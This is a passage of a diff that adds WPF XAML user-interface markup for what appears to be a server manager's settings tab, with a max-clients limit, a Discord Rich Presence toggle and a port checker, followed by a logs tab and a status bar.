+                            <TextBlock Text="MAX CONNECTED CLIENTS" Style="{StaticResource SFieldLabel}" />
+                            <TextBox x:Name="SettingsMaxClients" Style="{StaticResource STxt}" Text="1000" Width="120" HorizontalAlignment="Left" Margin="0,0,0,8" />
+                            <TextBlock Text="Rejects new connections when this limit is reached." Foreground="{StaticResource DimBrush}" FontSize="11" Margin="0,0,0,20" />
+
+                            <TextBlock Text="INTEGRATIONS" Style="{StaticResource SLabel}" FontSize="11" />
+                            <CheckBox x:Name="SettingsDiscordRPC" Content="Discord Rich Presence (show status on Discord)" Style="{StaticResource SChk}" IsChecked="False" Margin="0,0,0,20" />
+
+                            <TextBlock Text="PORT CHECKER" Style="{StaticResource SLabel}" FontSize="11" />
+                            <StackPanel Orientation="Horizontal" Margin="0,0,0,8">
+                                <TextBox x:Name="SettingsCheckIP" Style="{StaticResource STxt}" Width="180" Text="127.0.0.1" />
+                                <TextBlock Text=":" Foreground="{StaticResource DimBrush}" FontSize="14" VerticalAlignment="Center" Margin="6,0" />
+                                <TextBox x:Name="SettingsCheckPort" Style="{StaticResource STxt}" Width="70" Text="7777" />
+                                <Button Content="CHECK" Width="80" Margin="10,0,0,0" Style="{StaticResource SGreenBtn}" Click="CheckPort_Click" />
+                                <Button Content="GET IP" Width="80" Margin="10,0,0,0" Style="{StaticResource SBtn}" Click="GetMyIP_Click" />
+                            </StackPanel>
+                            <TextBlock x:Name="TxtPortResult" Text="" Foreground="{StaticResource DimBrush}" FontSize="12" Margin="0,0,0,20" />
+
+                            <Button Content="APPLY" Width="100" Style="{StaticResource SGreenBtn}" Click="SettingsApply_Click" HorizontalAlignment="Left" />
+                        </StackPanel>
+                    </Border>
+                </TabItem>
+
+                <!-- Logs Tab -->
+                <TabItem Header="Logs">
+                    <Border Background="{StaticResource SurfaceBrush}" Margin="8" Padding="10" CornerRadius="8">
+                        <ScrollViewer x:Name="LogScroller" VerticalScrollBarVisibility="Auto">
+                            <TextBlock x:Name="TxtLogs" Foreground="{StaticResource DimBrush}"
+                                       FontFamily="Consolas" FontSize="11" TextWrapping="Wrap" />
+                        </ScrollViewer>
+                    </Border>
+                </TabItem>
+            </TabControl>
+
+            <!-- Status Bar -->
+            <Border Grid.Row="3" Background="#0b0f15" Padding="18,7" CornerRadius="0,0,12,12"
+                    BorderBrush="{StaticResource BorderBrush}" BorderThickness="0,1,0,0">
+                <TextBlock x:Name="TxtStatusBar" Text="Ready" Foreground="{StaticResource DimBrush}" FontSize="11" />
+            </Border>
+        </Grid>
+    </Border>
+</Window>
